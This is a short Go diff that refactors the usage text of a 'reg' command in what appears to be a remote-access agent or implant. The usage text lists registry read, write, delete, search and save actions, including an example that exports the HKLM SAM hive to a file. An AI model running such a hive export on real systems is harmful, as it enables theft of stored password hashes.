@@ -46,17 +46,13 @@ func (c *RegCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Action == "" {
-		return structs.CommandResult{
-			Output: "Usage: reg -action <read|write|delete|search|save> [options]\n\n" +
-				"Actions:\n" +
-				"  read    — Read registry values (reg -action read -hive HKLM -path SOFTWARE\\...)\n" +
-				"  write   — Write registry values (reg -action write -hive HKCU -path ... -name Val -data hello -type REG_SZ)\n" +
-				"  delete  — Delete keys/values (reg -action delete -hive HKCU -path ... [-name Val] [-recursive true])\n" +
-				"  search  — Search registry recursively (reg -action search -pattern term [-hive HKLM] [-path SOFTWARE])\n" +
-				"  save    — Export hives to files (reg -action save -hive HKLM -path SAM -output C:\\Temp\\sam.hiv)\n",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("Usage: reg -action <read|write|delete|search|save> [options]\n\n" +
+			"Actions:\n" +
+			"  read    — Read registry values (reg -action read -hive HKLM -path SOFTWARE\\...)\n" +
+			"  write   — Write registry values (reg -action write -hive HKCU -path ... -name Val -data hello -type REG_SZ)\n" +
+			"  delete  — Delete keys/values (reg -action delete -hive HKCU -path ... [-name Val] [-recursive true])\n" +
+			"  search  — Search registry recursively (reg -action search -pattern term [-hive HKLM] [-path SOFTWARE])\n" +
+			"  save    — Export hives to files (reg -action save -hive HKLM -path SAM -output C:\\Temp\\sam.hiv)\n")
 	}
 
 	switch strings.ToLower(args.Action) {
